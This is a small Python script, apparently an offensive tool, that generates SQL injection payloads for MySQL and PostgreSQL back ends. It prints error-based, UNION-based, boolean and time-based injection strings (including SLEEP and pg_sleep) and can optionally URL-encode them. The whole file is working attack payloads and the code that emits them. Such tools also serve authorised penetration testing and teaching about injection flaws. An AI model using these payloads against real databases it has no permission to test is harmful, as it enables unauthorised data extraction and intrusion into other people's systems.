#!/usr/bin/env python3
import argparse
from urllib.parse import quote

payload_templates = {
    "mysql": {
        "error": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "union": "' UNION SELECT null, version(), user()-- -",
        "boolean": "' AND 1=1-- -",
        "time": "' AND SLEEP(5)-- -"
    },
    "pgsql": {
        "error": "'||(SELECT CASE WHEN LENGTH(version())>0 THEN 1/0 ELSE NULL END)-- -",
        "union": "' UNION SELECT null, version(), current_user-- -",
        "boolean": "' AND TRUE-- -",
        "time": "'; SELECT pg_sleep(5)--"
    }
}

def generate_payloads(backend, encode, format):
    results = []
    for typ, payload in payload_templates.get(backend, {}).items():
        if encode == "url":
            payload = quote(payload)
        elif encode == "html":
            payload = payload.replace("<", "&lt;").replace(">", "&gt;")
        results.append((typ, payload))
    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="🎯 SQLi Payload Generator")
    parser.add_argument("-b", "--backend", help="Database backend (mysql, pgsql)", required=True)
    parser.add_argument("-e", "--encode", help="Encoding (none, url, html)", default="none")
    args = parser.parse_args()

    payloads = generate_payloads(args.backend.lower(), args.encode.lower(), format="raw")
    print(f"\n[🔥] SQLi Payloads for {args.backend.upper()}:\n")
    for typ, payload in payloads:
        print(f"[{typ.upper()}] {payload}")
